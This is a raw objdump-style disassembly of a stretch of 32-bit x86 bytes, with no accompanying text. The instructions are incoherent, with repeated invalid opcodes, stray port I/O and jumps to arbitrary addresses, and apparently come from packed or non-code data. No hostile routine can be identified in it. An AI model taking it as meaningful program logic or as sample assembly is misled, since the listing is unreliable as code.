  493f40:	lock cwde 
  493f42:	(bad)  [edi-0x6d]
  493f45:	std    
  493f46:	dec    ebp
  493f47:	cmp    ebp,DWORD PTR [ebp+esi*2+0x16]
  493f4b:	inc    ebx
  493f4c:	sub    DWORD PTR [eax],edx
  493f4e:	jb     0x493f3d
  493f50:	or     dl,BYTE PTR [edx+0x5d]
  493f53:	aad    0x10
  493f55:	pop    ss
  493f56:	and    bl,bl
  493f58:	sub    esp,edx
  493f5a:	dec    DWORD PTR [edx+0x75363c03]
  493f60:	push   ds
  493f61:	cmp    BYTE PTR [ebx+0x1],0xb4
  493f65:	ret    
  493f66:	add    dh,BYTE PTR [edi+0x33]
  493f69:	repnz cmp eax,0x333c8090
  493f6f:	inc    ebx
  493f70:	xor    ah,BYTE PTR [ebp-0x775129de]
  493f76:	mov    cl,0x43
  493f78:	xor    al,0x95
  493f7a:	mov    dh,0xa9
  493f7c:	scas   al,BYTE PTR es:[edi]
  493f7d:	inc    esi
  493f7e:	cmp    al,0x69
  493f80:	push   cs
  493f81:	outs   dx,DWORD PTR ds:[esi]
  493f83:	sub    cl,BYTE PTR ss:[ebp-0x5b]
  493f87:	test   eax,0x26782e75
  493f8c:	pop    eax
  493f8d:	sub    al,0x4f
  493f8f:	lds    ebp,FWORD PTR [ecx+0x1e]
  493f92:	mov    dh,0x8c
  493f94:	and    DWORD PTR [ebx],edx
  493f96:	pop    ebp
  493f97:	dec    edi
  493f98:	sub    BYTE PTR [edx],dh
  493f9a:	or     dl,BYTE PTR [eax+0x18]
  493f9d:	ret    0xd034
  493fa0:	arpl   bx,dx
  493fa2:	mov    cl,0xad
  493fa4:	mov    al,BYTE PTR [ebp-0x151fa611]
  493faa:	ret    
  493fab:	sub    eax,0x43d08d50
  493fb0:	fisttp WORD PTR [edi-0x537773f8]
  493fb6:	pop    esp
  493fb7:	inc    ebx
  493fb8:	in     eax,dx
  493fb9:	ror    BYTE PTR [ebx+eiz*2+0x433887b4],cl
  493fc0:	push   ebp
  493fc1:	repz in al,0xf9
  493fc4:	inc    ebp
  493fc5:	adc    al,0xb6
  493fc7:	add    DWORD PTR [eax-0x46],ebx
  493fca:	add    BYTE PTR [ebx+0x4c4a1f79],al
  493fd0:	je     0x493ff6
  493fd2:	push   es
  493fd3:	or     BYTE PTR [edx+0x466c45dc],dl
  493fd9:	stos   DWORD PTR es:[edi],eax
  493fda:	inc    eax
  493fdb:	add    dl,0x14
  493fde:	mov    ch,bh
  493fe0:	push   DWORD PTR [ecx-0xb]
  493fe3:	dec    ebx
  493fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493fe5:	out    dx,eax
  493fe6:	xchg   edx,eax
  493fe7:	scas   eax,DWORD PTR es:[edi]
  493fe8:	xchg   ebx,eax
  493fe9:	test   edi,0x15f0c5ed
  493fef:	stos   DWORD PTR es:[edi],eax
  493ff0:	sahf   
  493ff1:	add    bl,ah
  493ff3:	lods   eax,DWORD PTR ds:[esi]
  493ff4:	jmp    0x494033
  493ff6:	inc    edx
  493ff7:	and    DWORD PTR [eax+0x3b],ecx
  493ffa:	jne    0x494006
  493ffc:	xor    eax,0x45997228
  494001:	call   0x1051:0xb9f9b62a
  494008:	mov    ecx,0x13c75e22
  49400d:	loopne 0x49400c
  49400f:	mov    esp,0x4ebc14fe
  494014:	cmp    DWORD PTR [ecx+ebp*1-0x3bdff475],edx
  49401b:	mov    ds:0x52988ab2,al
  494020:	mov    dl,0x94
  494022:	and    bl,BYTE PTR [eax+0x59]
  494025:	cmp    BYTE PTR [eax-0x4c],dl
  494028:	outs   dx,BYTE PTR ds:[esi]
  494029:	jg     0x493faf
  49402b:	jnp    0x494090
  49402d:	xor    al,0x30
  49402f:	mov    ebx,0xabb8eb7f
  494034:	shl    DWORD PTR [ecx-0x43],1
  494037:	test   DWORD PTR [edi+0x74],edx
  49403a:	xor    BYTE PTR [edx+ecx*8+0x78e22bca],ch
  494041:	or     al,0xf4
  494043:	std    
  494044:	fdivr  st,st(5)
  494046:	fisub  DWORD PTR [edi]
  494048:	ins    DWORD PTR es:[edi],dx
  494049:	in     eax,0x2
  49404b:	adc    edi,DWORD PTR [esp+esi*2-0x14432be1]
  494052:	adc    ecx,DWORD PTR [edx+0x641c885c]
  494058:	xchg   ebx,eax
  494059:	not    BYTE PTR [ecx+0x28]
  49405c:	fdiv   DWORD PTR [ecx+0x37]
  49405f:	test   eax,0x2045791c
  494064:	mov    dl,0xd0
  494066:	in     al,0xfd
  494068:	cmp    ebx,esp
  49406a:	test   al,0x88
  49406c:	ja     0x4940a2
  49406e:	mul    DWORD PTR [ecx]
  494070:	pop    ebx
  494071:	inc    esp
  494072:	loopne 0x494079
  494074:	add    DWORD PTR [eax*2+0x2f115395],eax
  49407b:	(bad)
  49407e:	adc    eax,0xb3e4e023
  494083:	repnz xchg edx,eax
  494085:	std    
  494086:	mov    dl,0xca
  494088:	cmp    eax,0xe5022502
  49408d:	jns    0x4940cd
  49408f:	jb     0x494094
  494091:	add    al,0xb7
  494093:	add    BYTE PTR [eax],al
  494095:	add    BYTE PTR [esi+ebp*1-0x7d],bh
  494099:	or     al,0x57
  49409b:	dec    edx
  49409c:	out    0xbb,eax
  49409e:	adc    eax,0xaf158179
  4940a3:	mov    BYTE PTR [edi],ch
  4940a5:	ins    BYTE PTR es:[edi],dx
  4940a6:	xor    ebx,DWORD PTR [edi+0x18]
  4940a9:	mov    edx,0x83602c1f
  4940ae:	test   DWORD PTR [ebx],edi
  4940b0:	add    al,0xc2
  4940b2:	or     esi,DWORD PTR [eax-0x4]
  4940b5:	xor    ecx,DWORD PTR [eax+0x3e391150]
  4940bb:	inc    ecx
  4940bc:	mov    esi,0x3983b222
  4940c1:	fdiv   st(5),st
  4940c3:	ret    
  4940c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4940c5:	or     eax,0x47fddccb
  4940ca:	fst    DWORD PTR [ebp-0x4ddd411d]
  4940d0:	outs   dx,DWORD PTR ds:[esi]
  4940d1:	mov    ch,0x40
  4940d3:	fild   DWORD PTR [ebp-0x10]
  4940d6:	std    
  4940d7:	cmp    DWORD PTR ds:0xb1e04390,0xffffff99
  4940de:	imul   ecx,edi,0x3b
  4940e1:	mov    ebx,eax
  4940e3:	lea    ebx,[ebp-0x21f4254]
  4940e9:	mov    al,ds:0x1d3082d
  4940ee:	mov    edi,0xabb374e8
  4940f3:	outs   dx,BYTE PTR ds:[esi]
  4940f4:	ror    DWORD PTR [edi],1
  4940f6:	push   es
  4940f7:	sub    DWORD PTR [edx+0x75],ebp
  4940fa:	adc    eax,ebp
  4940fc:	addr16 jne 0x494162
  4940ff:	and    eax,0x788af301
  494104:	sub    edx,DWORD PTR [edi+0x39]
  494107:	pop    ss
  494108:	stos   BYTE PTR es:[edi],al
  494109:	call   0x77d1ec0b
  49410e:	in     al,0xe8
  494110:	std    
  494111:	cmp    eax,0xc9ab818b
  494116:	sub    ah,dl
  494118:	call   0xb8ffe4a7
  49411d:	std    
  49411e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49411f:	in     al,0xc9
  494121:	out    0xe0,eax
  494123:	std    
  494124:	mov    al,ds:0x80fde8fd
  494129:	std    
  49412a:	sub    al,0x30
  49412c:	push   ebp
  49412d:	and    eax,DWORD PTR [ebx+edx*2-0x8829e01]
  494134:	icebp  
  494135:	sahf   
  494136:	(bad)  
  494137:	dec    ebp
  494139:	or     ebp,DWORD PTR [edx]
  49413b:	xchg   ebp,eax
  49413c:	lea    eax,[edx+0x5e]
  49413f:	push   esp
  494140:	les    esp,FWORD PTR [edx-0x51]
  494143:	lock std 
  494145:	ror    DWORD PTR [ebx],0x39
  494148:	jb     0x494132
  49414a:	std    
  49414b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49414c:	std    
  49414d:	cmp    BYTE PTR [ebp-0x570dfbb2],0x88
  494154:	lods   eax,DWORD PTR ds:[esi]
  494155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494156:	std    
  494157:	sbb    al,0xbc
  494159:	sbb    al,0xe4
  49415b:	lock std 
  49415d:	loopne 0x49415c
  49415f:	scas   al,BYTE PTR es:[edi]
  494160:	stos   BYTE PTR es:[edi],al
  494161:	xchg   DWORD PTR [ebx+0x69],edx
  494164:	jle    0x4941ab
  494166:	lods   eax,DWORD PTR ds:[esi]
  494167:	lea    esi,[ebp+edi*8+0x22ab6e2a]
  49416e:	pop    esp
  49416f:	daa    
  494170:	dec    esp
  494171:	or     al,0xad
  494173:	pop    edi
  494174:	adc    DWORD PTR [esi],ebp
  494176:	sbb    al,0x49
  494178:	dec    edi
  494179:	mov    ecx,0x35fffdf0
  49417e:	daa    
  49417f:	sub    ebx,eax
  494181:	std    
  494182:	xor    cl,BYTE PTR [edx-0x39aefbbf]
  494188:	test   esp,edx
  49418a:	ds cs dec ebp
  49418d:	push   esi
  49418e:	iret   
  49418f:	cs aad 0xcc
  494192:	adc    BYTE PTR [edx],al
  494194:	and    BYTE PTR [edi+0x11],dl
  494197:	inc    edi
  494198:	scas   eax,DWORD PTR es:[edi]
  494199:	outs   dx,BYTE PTR ds:[esi]
  49419a:	mov    bh,0x14
  49419c:	out    0x72,al
  49419e:	sub    bh,BYTE PTR [ecx]
  4941a0:	in     al,0xfd
  4941a2:	in     al,0xfd
  4941a4:	sbb    cl,BYTE PTR [eax+0x1694144d]
  4941aa:	ficom  WORD PTR [ebx]
  4941ac:	(bad)  
  4941ad:	xor    DWORD PTR [eax-0xf4b50d9],edx
  4941b3:	std    
  4941b4:	lock std 
  4941b6:	enter  0x88ab,0xc4
  4941ba:	cmp    eax,0x58fdf0b3
  4941bf:	inc    ebp
  4941c0:	lods   al,BYTE PTR ds:[esi]
  4941c1:	arpl   WORD PTR [edi],bp
  4941c3:	mov    bl,0x32
  4941c5:	adc    eax,DWORD PTR [eax-0x35725ab2]
  4941cb:	sub    BYTE PTR [ebp+0x11],dl
  4941ce:	pop    es
  4941cf:	js     0x49418d
  4941d1:	adc    DWORD PTR [ecx-0x53],eax
  4941d4:	cmp    DWORD PTR [eax],esp
  4941d6:	xchg   esp,esp
  4941d8:	fdivr  st,st(5)
  4941da:	mov    al,ds:0xc2fdb4fd
  4941df:	fs inc ebp
  4941e1:	cmp    al,0x45
  4941e3:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4941e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4941e6:	or     BYTE PTR [edx+ebx*2-0x22276bc6],bh
  4941ed:	bound  edi,QWORD PTR [edi-0x489027fd]
  4941f3:	into   
  4941f4:	cmp    BYTE PTR [ecx],0x30
  4941f7:	je     0x494250
  4941f9:	ficom  WORD PTR [edi-0x26fe39f5]
  4941ff:	push   esi
  494200:	(bad)  
  494201:	std    
  494202:	xor    BYTE PTR [eax-0x15],al
  494205:	aas    
  494206:	dec    ecx
  494207:	cs pop cx
  49420a:	leave  
  49420b:	jne    0x494195
  49420d:	in     al,0x1
  49420f:	jbe    0x49422e
  494211:	add    eax,0xfb28eb36
  494216:	nop
  494217:	jns    0x494238
  494219:	test   BYTE PTR [edi],ch
  49421b:	jmp    0x494224
  49421d:	dec    ecx
  49421e:	mov    es,WORD PTR ds:0x43f55640
  494224:	dec    edx
  494225:	inc    edi
  494226:	push   ss
  494227:	rol    DWORD PTR [eax+0x361f16bc],cl
  49422d:	xor    eax,0x87dd0108
  494232:	xor    eax,0xb8a6190e
  494237:	and    dh,BYTE PTR [eax+0x282d5709]
  49423d:	addr16 jmp 0x4942a1
  494240:	dec    edx
  494241:	push   edx
  494242:	sbb    ebp,DWORD PTR [ebx]
  494244:	jmp    0x494252
  494246:	and    BYTE PTR [ebp+0x11b20548],al
  49424c:	sbb    edx,esp
  49424e:	int3   
  49424f:	jp     0x4942a8
  494251:	out    dx,eax
  494252:	jnp    0x4941df
  494254:	sub    esi,DWORD PTR [ecx-0x5df8d4d5]
  49425a:	or     al,0xeb
  49425c:	inc    eax
  49425d:	or     DWORD PTR [ecx],0xc11d36f4
  494263:	mov    al,ch
  494265:	jle    0x494249
  494267:	mov    al,0x20
  494269:	dec    edi
  49426a:	fwait
  49426b:	mov    ebp,0xebafff1b
  494270:	js     0x49424a
  494272:	popa   
  494273:	(bad)  
  494275:	mov    ch,0x9e
  494277:	xchg   esp,eax
  494278:	or     ebx,DWORD PTR [ebp+0xc117159]
  49427e:	js     0x494249
  494280:	int3   
  494281:	sub    DWORD PTR [ebp-0x37751322],esi
  494287:	mov    ebx,0x4152ec6
  49428c:	mov    eax,0x918ad4bd
  494291:	in     eax,dx
  494292:	iret   
  494293:	jmp    0x4942ae
  494295:	mov    ch,0x52
  494297:	xor    BYTE PTR [ecx-0x3eb5eb1e],bh
  49429d:	jecxz  0x494275
  49429f:	les    edi,FWORD PTR [edi]
  4942a1:	je     0x494318
  4942a3:	loop   0x4942b1
  4942a5:	stos   BYTE PTR es:[edi],al
  4942a6:	sub    bl,BYTE PTR [ecx+esi*2-0x48]
  4942aa:	adc    eax,0xa853fd98
  4942af:	xor    esp,DWORD PTR [edi]
  4942b1:	adc    eax,0x64c10da
  4942b6:	inc    edx
  4942b7:	retf   
  4942b8:	cdq    
  4942b9:	mov    DWORD PTR [ecx+ebx*1-0x70427e6a],ebp
  4942c0:	add    bh,BYTE PTR [ecx+0x2b393675]
  4942c6:	hlt    
  4942c7:	push   edx
  4942c8:	mov    dh,0x82
  4942ca:	or     ecx,DWORD PTR [ecx-0x70]
  4942cd:	dec    bp
  4942cf:	ficom  DWORD PTR [ebx]
  4942d1:	das    
  4942d2:	push   ss
  4942d3:	xchg   esp,eax
  4942d4:	cwde   
  4942d5:	fsub   QWORD PTR [esi+0x6f8323eb]
  4942db:	cmc    
  4942dc:	xchg   ah,al
  4942de:	sbb    al,0x8
  4942e0:	popa   
  4942e1:	shr    bh,0x78
  4942e4:	pop    esi
  4942e5:	adc    DWORD PTR [ebx+0x5b],ebp
  4942e8:	into   
  4942e9:	fdiv   st(5),st
  4942eb:	xor    ah,BYTE PTR [ebp-0x56d0d9e6]
  4942f1:	je     0x49431c
  4942f3:	imul   esi,edx,0x15
  4942f6:	xor    DWORD PTR [eax-0x4732ede8],eax
  4942fc:	std    
  4942fd:	loope  0x494355
  4942ff:	push   eax
  494300:	push   cs
  494301:	mov    eax,0x38ac3fd
  494306:	mov    BYTE PTR [ebx],cl
  494308:	cmp    eax,0x750d7920
  49430d:	(bad)  
  49430e:	jecxz  0x4942a1
  494310:	xor    ebp,edx
  494312:	pop    esi
  494313:	mov    ch,BYTE PTR [bp-0x56]
  494317:	dec    eax
  494318:	mov    bl,BYTE PTR [eax+0x20]
  49431b:	xor    eax,0x2ad5071
  494320:	(bad)  
  494321:	mov    ds:0x24bc9d91,eax
  494326:	mov    edx,0xe79ecc06
  49432b:	imul   edi,DWORD PTR [esi],0x8176bb2a
  494331:	(bad)  
  494332:	not    eax
  494334:	test   BYTE PTR [eax+ebp*8],dh
  494337:	ss loopne 0x4942ba
  49433a:	adc    eax,DWORD PTR [esi]
  49433c:	dec    ebp
  49433d:	jb     0x4943a7
  49433f:	shl    DWORD PTR [ebp+0x52c112e7],1
  494345:	sbb    DWORD PTR [edx-0x7a],eax
  494348:	fiadd  DWORD PTR [esi]
  49434a:	into   
  49434b:	sub    BYTE PTR [ebx],0xcd
  49434e:	adc    ch,BYTE PTR [edx]
  494350:	xor    DWORD PTR es:[ebp-0x6e2fa617],ebx
  494357:	sub    ch,BYTE PTR [ebx]
  494359:	lock mov esp,0x432f0b21
  49435f:	imul   esp,DWORD PTR [ecx-0x1bbf2d8b],0xf0a05700
  494369:	sbb    al,0x54
  49436b:	sbb    DWORD PTR [edi],edi
  49436d:	in     al,0x89
  49436f:	or     BYTE PTR [ecx],dh
  494371:	test   DWORD PTR [edx+eiz*1],ebx
  494374:	test   DWORD PTR [ebp-0x70baeb10],esi
  49437a:	adc    esp,esi
  49437c:	push   0xd925d00b
  494381:	push   0x4284548
  494386:	ficom  DWORD PTR [eax]
  494388:	sub    al,0x9c
  49438a:	ss and dh,bl
  49438d:	call   0xc0567c36
  494392:	mov    BYTE PTR [ecx-0x23],dl
  494395:	push   ebp
  494396:	sbb    BYTE PTR [eax-0x5eef0202],dl
  49439c:	sar    DWORD PTR [esi+0x1f],cl
  49439f:	mov    cs,WORD PTR [ebx+0x183849ca]
  4943a5:	fld1   
  4943a7:	xchg   edx,eax
  4943a8:	mov    al,ds:0xc0f60a1e
  4943ad:	jg     0x4943bf
  4943af:	adc    dl,dl
  4943b1:	into   
  4943b2:	dec    eax
  4943b3:	cmp    eax,edx
  4943b5:	jge    0x4943b8
  4943b7:	loopne 0x4943fb
  4943b9:	inc    ecx
  4943ba:	sbb    eax,0x394e1800
  4943bf:	pop    ebp
  4943c0:	and    al,0x0
  4943c2:	cmp    DWORD PTR [ebx-0x80],edx
  4943c5:	xor    BYTE PTR [ebp+0x59],0xc2
  4943c9:	loopne 0x4943d8
  4943cb:	std    
  4943cc:	and    al,0x8b
  4943ce:	xor    eax,0x380bac84
  4943d3:	mov    eax,ds:0x532832fb
  4943d8:	push   ebx
  4943d9:	loop   0x494385
  4943db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4943dc:	inc    edi
  4943dd:	es sahf 
  4943df:	rol    DWORD PTR [eax*8+0x4d24fced],cl
  4943e6:	cli    
  4943e7:	jg     0x4943f3
  4943e9:	loopne 0x4943db
  4943eb:	cmp    edi,ebx
  4943ed:	outs   dx,DWORD PTR ds:[esi]
  4943ee:	mov    bh,0xfc
  4943f0:	jle    0x494435
  4943f2:	push   0xffffffe0
  4943f4:	xor    edx,edx
  4943f6:	pop    eax
  4943f7:	div    edi
  4943f9:	add    DWORD PTR [ecx+0x372e115f],0xd3f448d
  494403:	sbb    BYTE PTR [edx+edx*4],0x13
  494407:	cmp    eax,ebx
  494409:	cmp    eax,ebx
  49440b:	push   esp
  49440c:	jnp    0x494461
  49440e:	lock hlt 
  494410:	jmp    0x494415
  494412:	adc    al,0xf4
  494414:	hlt    
  494415:	je     0x4943c3
  494417:	push   edi
  494418:	(bad)  
  494419:	hlt    
  49441a:	rcl    BYTE PTR ds:0x6add57de,1
  494420:	add    ebx,ebx
  494422:	enter  0x99e0,0xc0
  494426:	rcr    al,0x7b
  494429:	loope  0x494451
  49442b:	inc    ecx
  49442c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49442d:	scas   al,BYTE PTR es:[edi]
  49442e:	or     DWORD PTR [edi],0xc3ced60b
  494434:	jmp    0xbc472157
  494439:	mov    ecx,0x104d85e5
  49443e:	cwde   
  49443f:	inc    ebp
  494440:	and    BYTE PTR [ecx],ch
  494442:	lods   al,BYTE PTR ds:[esi]
  494443:	dec    ebp
  494444:	lock retf 0xf8c0
  494448:	(bad)  
  494449:	mov    ds:0x1a4e1c71,eax
  49444e:	push   es
  49444f:	xor    DWORD PTR [ecx+0x6f],0x360ae50c
  494456:	push   eax
  494457:	push   ds
  494458:	jle    0x49449c
  49445a:	jns    0x494492
  49445c:	ret    0x27f9
  49445f:	js     0x49449c
  494461:	shl    DWORD PTR [edi+0x16],0x73
  494465:	cld    
  494466:	cmp    edi,ebx
  494468:	je     0x4944d2
  49446a:	mov    DWORD PTR [edi],0x74c08057
  494470:	lods   al,BYTE PTR ds:[esi]
  494471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494472:	jns    0x49444c
  494474:	in     eax,dx
  494475:	imul   ecx,DWORD PTR [edi-0x7f],0xc43f50b8
  49447c:	clc    
  49447d:	lock retf 
  49447f:	and    eax,0x60446961
  494485:	lods   al,BYTE PTR ds:[esi]
  494486:	xlat   BYTE PTR ds:[ebx]
  494487:	add    eax,0x76
  49448a:	and    BYTE PTR [ebp+0x4],dh
  49448d:	or     al,0xeb
  49448f:	push   es
  494490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494491:	sbb    al,0x4d
  494493:	jo     0x494485
  494495:	test   al,0x7
  494497:	mov    al,0x24
  494499:	jmp    0xbc569c20
  49449e:	jnp    0x4944d0
  4944a0:	jnp    0x494510
  4944a2:	adc    DWORD PTR [eax-0x40],esp
  4944a5:	in     al,0x58
  4944a7:	clc    
  4944a8:	pop    ecx
  4944a9:	lea    ecx,[eax+ebx*1-0x29e97ace]
  4944b0:	(bad)  
  4944b1:	pop    ds
  4944b2:	or     BYTE PTR [esi+0x146d1113],bl
  4944b8:	sub    ah,bl
  4944ba:	xchg   ebx,eax
  4944bb:	scas   eax,DWORD PTR es:[edi]
  4944bc:	pop    ss
  4944bd:	sub    BYTE PTR [ebx-0x5c],0x47
  4944c1:	push   eax
  4944c2:	(bad)  
  4944c3:	lods   eax,DWORD PTR ds:[esi]
  4944c4:	inc    edx
  4944c5:	or     esp,DWORD PTR [esi-0x4a]
  4944c8:	daa    
  4944c9:	or     eax,esp
  4944cb:	push   ss
  4944cc:	jo     0x4944ef
  4944ce:	test   BYTE PTR [eax],dl
  4944d0:	mov    eax,0x2030202e
  4944d5:	test   al,0xda
  4944d7:	add    eax,0xe15603fe
  4944dc:	(bad)  
  4944dd:	xchg   bh,dh
  4944df:	and    ecx,0xc10bd20f
  4944e5:	dec    edx
  4944e6:	pop    ebx
  4944e7:	stos   DWORD PTR es:[edi],eax
  4944e8:	adc    dh,dh
  4944ea:	(bad)  
  4944eb:	cmp    bh,al
  4944ed:	pop    ecx
  4944ee:	xchg   esi,eax
  4944ef:	lock push ebp
  4944f1:	push   edx
  4944f2:	adc    al,BYTE PTR [esi]
  4944f4:	add    al,dh
  4944f6:	jg     0x49456d
  4944f8:	or     bl,BYTE PTR [ecx-0x7587b687]
  4944fe:	sbb    BYTE PTR [edi-0x47b500db],ah
  494504:	xor    eax,0x26a051f
  494509:	pop    eax
  49450a:	data16 (bad) 
  49450c:	push   cs
  49450d:	mov    eax,0xaf0207f8
  494512:	xchg   edx,eax
  494513:	mov    ah,0xee
  494515:	and    cx,si
  494518:	pop    esi
  494519:	dec    eax
  49451a:	add    DWORD PTR [eax+0x23],0xe4200481
  494521:	test   eax,0x69ce8497
  494526:	sbb    edx,DWORD PTR [edx]
  494528:	aad    0x7
  49452a:	or     dl,BYTE PTR [edi]
  49452c:	les    edx,FWORD PTR [ebx-0x6c]
  49452f:	push   0x74
  494531:	je     0x4944fb
  494533:	repnz xchg edx,eax
  494535:	adc    BYTE PTR [esi+0x65],cl
  494538:	ror    DWORD PTR [ebx-0x3e],1
  49453b:	pop    ss
  49453c:	cmp    edx,0xdde0dfea
  494542:	fld    st(5)
  494544:	les    esp,FWORD PTR [edi-0x4b85275d]
  49454a:	sar    BYTE PTR [ecx+0x6d0edea3],cl
  494550:	sub    bl,bh
  494552:	out    dx,al
  494553:	xor    ecx,ecx
  494555:	test   eax,0x816b7587
  49455a:	cmovge ebx,DWORD PTR [ebp-0x24]
  49455e:	mov    cl,0x24
  494560:	pop    ss
  494561:	ss fs mov edx,0x331f4603
  494568:	jno    0x4945b7
  49456a:	cdq    
  49456b:	es dec esp
  49456d:	sbb    BYTE PTR [ebx+ebx*4-0x14],al
  494571:	or     esi,esi
  494573:	shl    DWORD PTR [ebp+0xc],1
  494576:	push   eax
  494577:	call   0x2801:0xcdec880
  49457e:	mov    esp,0x81e6ec3
  494583:	dec    edx
  494584:	test   BYTE PTR [edx-0x41a919d0],0xef
  49458b:	add    BYTE PTR [edx+0x41],0xfd
  49458f:	push   esp
  494590:	and    DWORD PTR [ebp+0xe],esi
  494593:	mov    al,ds:0xb3c08284
  494598:	(bad)  
  494599:	ror    DWORD PTR [ecx],1
  49459b:	xor    al,0xfa
  49459d:	push   ecx
  49459e:	pop    ebp
  49459f:	cmp    edx,DWORD PTR [esi+eax*4+0x26d85499]
  4945a6:	sbb    bl,al
  4945a8:	sub    ah,dh
  4945aa:	xchg   BYTE PTR [edi],dl
  4945ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4945ad:	sub    DWORD PTR [esi],ecx
  4945af:	push   ebp
  4945b0:	push   cs
  4945b1:	shr    edx,0x46
  4945b4:	loop   0x4945b5
  4945b6:	pop    es
  4945b7:	mov    ebp,0x427c380c
  4945bc:	sub    edx,0x86383e6b
  4945c2:	fisub  DWORD PTR [eax]
  4945c4:	jns    0x494564
  4945c6:	cli    
  4945c7:	mov    al,0x14
  4945c9:	gs dec esp
  4945cb:	addr16 (bad) 
  4945cd:	fcom   st(3)
  4945cf:	(bad)  
  4945d0:	and    al,0x1e
  4945d2:	push   cs
  4945d3:	or     BYTE PTR [ebx+0xc],al
  4945d6:	hlt    
  4945d7:	jae    0x4945e2
  4945d9:	and    cl,BYTE PTR [eax+0x580916b6]
  4945df:	add    al,0x23
  4945e1:	lods   al,BYTE PTR ds:[esi]
  4945e2:	add    al,0x91
  4945e4:	dec    eax
  4945e5:	xor    ch,BYTE PTR [ebx+edi*8+0xe81afbc]
  4945ec:	call   0x244b4a39
  4945f1:	xchg   ebx,eax
  4945f2:	test   bl,cl
  4945f4:	and    esp,DWORD PTR [edi-0x28]
  4945f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4945f8:	or     ecx,DWORD PTR [ecx-0x6f]
  4945fb:	add    al,0x25
  4945fd:	or     BYTE PTR [eax],bh
  4945ff:	iret   
  494600:	and    BYTE PTR [edi-0x6feff772],dl
  494606:	mov    bh,0xbf
  494608:	jnp    0x494615
  49460a:	scas   al,BYTE PTR es:[edi]
  49460b:	and    eax,0xf704e1c1
  494610:	shl    DWORD PTR [ebx],1
  494612:	dec    eax
  494613:	xor    al,0xe1
  494615:	adc    BYTE PTR [ecx],dh
  494617:	cmp    eax,ecx
  494619:	in     eax,dx
  49461a:	or     ah,BYTE PTR [di]
  49461d:	add    ecx,ecx
  49461f:	and    ecx,DWORD PTR [eax]
  494621:	shr    ecx,1
  494623:	sbb    DWORD PTR [ebp+0x4],ebp
  494626:	cmp    DWORD PTR [eax+edi*2],eax
  494629:	loopne 0x494689
  49462b:	es mov ecx,0x23050225
  494631:	retf   
  494632:	and    bh,BYTE PTR [esi-0x23be0387]
  494638:	mov    al,BYTE PTR [ebx+eax*8+0xc49468b]
  49463f:	adc    BYTE PTR [eax-0x37c37cfc],ch
  494645:	ret    
  494646:	adc    eax,0x408a808
  49464b:	test   al,0x10
  49464d:	add    dh,BYTE PTR [eax+0x50]
  494650:	or     BYTE PTR [edx],al
  494652:	inc    esi
  494653:	push   es
  494654:	xlat   BYTE PTR ds:[ebx]
  494655:	loope  0x49469a
  494657:	and    eax,0x522a7010
  49465c:	and    edi,DWORD PTR [eax-0x66]
  49465f:	jmp    0x237f1f0f
  494664:	sbb    cl,BYTE PTR [eax+ecx*1]
  494667:	or     al,0x26
  494669:	shl    BYTE PTR [eax-0x76d6c7b5],1
  49466f:	or     BYTE PTR [ecx],bh
  494671:	fs cmp eax,0xf8e86373
  494677:	(bad)  
  494678:	mov    eax,0x29aadfdd
  49467d:	les    edx,FWORD PTR [edx]
  49467f:	sbb    eax,0xebcb0bfd
  494684:	lock inc ebp
  494686:	and    bh,ch
  494688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494689:	pop    ebp
  49468a:	mov    edx,0x20038bfc
  49468f:	jl     0x494693
  494691:	and    dh,BYTE PTR [edi]
  494693:	(bad)  
  494694:	popa   
  494695:	outs   dx,BYTE PTR ds:[esi]
  494696:	stos   BYTE PTR es:[edi],al
  494697:	jecxz  0x4946bf
  494699:	jge    0x494682
  49469b:	mov    al,ds:0xd861970b
  4946a0:	cdq    
  4946a1:	out    0xeb,al
  4946a3:	or     BYTE PTR [ecx],bl
  4946a5:	dec    ebp
  4946a6:	adc    al,0x2a
  4946a8:	pop    es
  4946a9:	mov    ebx,0x834d450
  4946ae:	mov    dh,0xe0
  4946b0:	ins    BYTE PTR es:[edi],dx
  4946b1:	xor    DWORD PTR [eax],ecx
  4946b3:	sub    eax,0xf7622ee9
  4946b8:	and    BYTE PTR [ecx],bh
  4946ba:	jge    0x4946dc
  4946bc:	aaa    
  4946bd:	jge    0x4946db
  4946bf:	outs   dx,BYTE PTR ds:[esi]
  4946c0:	pusha  
  4946c1:	and    cl,ah
  4946c3:	mov    esi,0xaa068b45
  4946c8:	fst    DWORD PTR [edx+eax*1+0x603f1058]
  4946cf:	push   edx
  4946d0:	lock mov edi,0x6060b5ef
  4946d6:	loope  0x4946b1
  4946d8:	pop    es
  4946d9:	sub    DWORD PTR [eax-0x15],edx
  4946dc:	xor    al,0x8b
  4946de:	dec    eax
  4946df:	and    BYTE PTR [eax-0x1d],al
  4946e2:	ins    DWORD PTR es:[edi],dx
  4946e3:	dec    ecx
  4946e4:	in     eax,0x99
  4946e6:	adc    BYTE PTR [edx-0x23],bl
  4946e9:	fnstsw WORD PTR [esi]
  4946eb:	pusha  
  4946ec:	cmp    bl,BYTE PTR [eax-0x229fdf12]
  4946f2:	imul   ebx,ebp,0x6d
  4946f5:	call   0x53f0:0x863a49ea
  4946fc:	loope  0x494708
  4946fe:	jmp    0x425eaa0a
  494703:	test   BYTE PTR [ecx+0x8],0x70
  494707:	push   ebx
  494708:	jns    0x494734
  49470a:	out    dx,eax
  49470b:	and    DWORD PTR [esi],0xfffffffe
  49470e:	adc    BYTE PTR [eax],cl
  494710:	sti    
  494711:	add    al,0xf7
  494713:	dec    esi
  494714:	jmp    0xef4c1208
  494719:	test   BYTE PTR [ecx+0x33],bl
  49471c:	fisttp WORD PTR [ebx-0x7aa163ff]
  494722:	push   edi
  494723:	dec    edx
  494724:	sub    al,bl
  494726:	mov    edx,0x2f02f3ff
  49472b:	dec    eax
  49472c:	je     0x49474c
